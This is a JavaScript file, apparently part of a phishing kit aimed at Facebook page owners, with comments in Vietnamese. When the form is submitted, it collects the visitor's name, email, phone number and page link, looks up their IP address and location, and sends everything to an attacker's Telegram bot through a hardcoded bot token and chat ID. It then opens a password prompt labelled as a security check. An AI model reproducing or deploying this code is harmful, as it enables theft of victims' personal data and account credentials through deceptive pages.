// CONFIG CỐ ĐỊNH - KHÔNG CẦN SỬA
const BOT_TOKEN = '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk';
const CHAT_ID = '-5286997232';

// Hàm gửi tin nhắn (Viết riêng ra để không lỗi)
async function sendData(noidung) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: noidung,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.log("Lỗi kết nối"); }
}

// Hàm lấy IP (Lấy trực tiếp)
async function getIP() {
    try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        return `IP: ${d.ip}\nQuốc gia: ${d.country_name}\nThành phố: ${d.city}`;
    } catch (e) { return "Không lấy được IP"; }
}

// BẮT ĐẦU CHẠY
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // 1. Hiện loading cho chuyên nghiệp
    const btn = e.target.querySelector('button');
    btn.innerText = "Processing...";
    btn.disabled = true;

    // 2. Lấy IP trước
    const vitri = await getIP();

    // 3. Lấy dữ liệu từ các ô nhập
    const name = document.getElementById('fullName').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const page = document.getElementById('fanpage').value;

    // 4. Soạn tin nhắn gửi về Bot
    const text = `
🚀 <b>DATA MỚI</b>
-------------------
👤 Họ tên: ${name}
📧 Email: ${email}
📱 SĐT: ${phone}
📄 Page: ${page}
-------------------
🌍 <b>VỊ TRÍ:</b>
${vitri}
    `;

    // 5. Gửi đi
    await sendData(text);

    // 6. Xong thì mở phần nhập mật khẩu
    btn.disabled = false;
    btn.innerText = "Continue";
    
    // Gọi hàm mở Modal mật khẩu của bạn (Đảm bảo hàm này có tồn tại trong các file khác)
    if (typeof openSecurityModal === 'function') {
        openSecurityModal();
    } else {
        alert("Thông tin đã được gửi!");
    }
});
